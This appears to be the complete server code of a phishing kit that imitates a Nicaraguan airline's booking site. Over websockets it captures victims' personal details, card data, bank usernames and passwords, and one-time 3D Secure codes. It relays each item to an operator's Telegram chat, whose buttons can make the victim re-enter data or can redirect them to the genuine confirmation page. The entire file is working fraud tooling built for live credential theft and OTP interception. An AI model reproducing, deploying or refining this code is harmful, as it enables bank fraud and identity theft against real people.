const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const TelegramBot = require('node-telegram-bot-api');
require('dotenv').config();

const app = express();
const server = http.createServer(app);

// Configuración de Socket.io con CORS abierto
const io = new Server(server, {
    cors: {
        origin: "*", 
        methods: ["GET", "POST"]
    }
});

// Configuración del Bot de Telegram
const token = process.env.TELEGRAM_BOT_TOKEN;
const chatId = process.env.TELEGRAM_CHAT_ID;

if (!token || !chatId) {
    console.warn("⚠️ Advertencia: Variables de entorno no encontradas.");
}

// Creamos el bot sin polling automático para evitar el error 409 Conflict
const bot = new TelegramBot(token, { polling: false });

// Función para iniciar la conexión segura
async function startBot() {
    try {
        // Obtenemos las últimas actualizaciones para asegurar que somos los únicos conectados
        const updates = await bot.getUpdates({ timeout: 0, limit: 1 });
        console.log("✅ Bot conectado correctamente a Telegram");
        
        // Iniciamos un loop de polling manual controlado
        let offset = 0;
        const pollLoop = async () => {
            try {
                const updates = await bot.getUpdates({ offset: offset, timeout: 5 });
                if (updates.length > 0) {
                    for (let update of updates) {
                        offset = update.update_id + 1;
                        if (update.callback_query) {
                            bot.processUpdate(update);
                        }
                    }
                }
            } catch (err) {
                // Si hay error 409, esperamos un poco y reintentamos
                if (err.code === 409) {
                    console.log("⚠️ Conflicto detectado, reiniciando loop...");
                    setTimeout(pollLoop, 2000);
                    return;
                }
                console.error("Error en polling:", err);
            }
            setTimeout(pollLoop, 500); // Revisar cada medio segundo
        };
        
        pollLoop();
    } catch (err) {
        console.error("Error inicial conectando al bot:", err);
    }
}

startBot();

io.on('connection', (socket) => {
    console.log(`Cliente conectado: ${socket.id}`);
    socket.emit('register', 'connected');

    // 1. DATOS DEL PASAJERO
    socket.on('submit_passengers', (data) => {
        const msg = `🎫 *Datos de Pasajero*\n\n` +
                    `👤 Nombre: ${data.fullName}\n` +
                    `📧 Email: ${data.email}\n` +
                    `📞 Tel: ${data.phone}\n\n` +
                    `¿Aprobar?`;
        
        bot.sendMessage(chatId, msg, {
            reply_markup: { inline_keyboard: [
                [{ text: "✅ Aprobar", callback_data: `approve_${socket.id}` }],
                [{ text: "❌ Pedir Corrección", callback_data: `retry_${socket.id}` }]
            ]}
        });
    });

    // 2. TARJETA DE CRÉDITO
    socket.on('card_payment', (data) => {
        const last4 = data.number.slice(-4);
        const msg = `💳 *Tarjeta Interceptada*\n\n` +
                    `Número: **** **** **** ${last4}\n` +
                    `Nombre: ${data.name}\n` +
                    `Exp: ${data.expiry}\n` +
                    `CVV: ***\n\n` +
                    `¿Validar?`;

        bot.sendMessage(chatId, msg, {
            reply_markup: { inline_keyboard: [
                [{ text: "✅ Validar Pago", callback_data: `validate_${socket.id}` }],
                [{ text: "❌ Reintentar Tarjeta", callback_data: `retry_card_${socket.id}` }]
            ]}
        });
    });

    // 3. LOGIN BANCARIO (Usuario y Clave)
    socket.on('bank_login', (data) => {
        const msg = `🏦 *Login Bancario Capturado*\n\n` +
                    `👤 Usuario: ${data.user}\n` +
                    `🔑 Clave: ${data.pass}\n\n` +
                    `¿Correcto?`;
        
        bot.sendMessage(chatId, msg, {
            reply_markup: { inline_keyboard: [
                [{ text: "✅ Correcto", callback_data: `ok_${socket.id}` }],
                [{ text: "❌ Reintentar", callback_data: `retry_${socket.id}` }]
            ]}
        });
    });

    // 4. OTP / 3D SECURE
    socket.on('otp_verify', (data) => {
        bot.sendMessage(chatId, `🔐 *OTP Ingresado*: ${data.code}\n\n¿Es correcto?`, {
            reply_markup: { inline_keyboard: [
                [{ text: "✅ Correcto (Éxito)", callback_data: `success_${socket.id}` }],
                [{ text: "❌ Incorrecto", callback_data: `retry_otp_${socket.id}` }]
            ]}
        });
    });

    // Manejo de Botones de Telegram
    bot.on('callback_query', (query) => {
        const action = query.data;
        const socketId = action.split('_')[1];
        const type = action.split('_')[0];

        // Lógica de "Pedir Corrección"
        if (type === 'retry') {
            io.to(socketId).emit('force_retry', { 
                message: "Error en los datos. Por favor ingrésalos nuevamente.",
                clearFields: ['all'] 
            });
        } else if (type === 'retry_card') {
            io.to(socketId).emit('force_retry', { 
                message: "Error en la tarjeta. Verifique los datos.",
                clearFields: ['card'] 
            });
        } else if (type === 'retry_otp') {
            io.to(socketId).emit('force_retry', { 
                message: "Código inválido. Intente de nuevo.",
                clearFields: ['otp'] 
            });
        } else if (type.startsWith('ok') || type.startsWith('validate') || type.startsWith('success')) {
            // Éxito -> Redirigir al final
            io.to(socketId).emit('redirect_success', {
                message: "Procesando...",
                url: "https://www.lacostena.com.ni/Booking/Confirmation" 
            });
        }
        bot.answerCallbackQuery(query.id);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Servidor corriendo en puerto ${PORT}`);
});
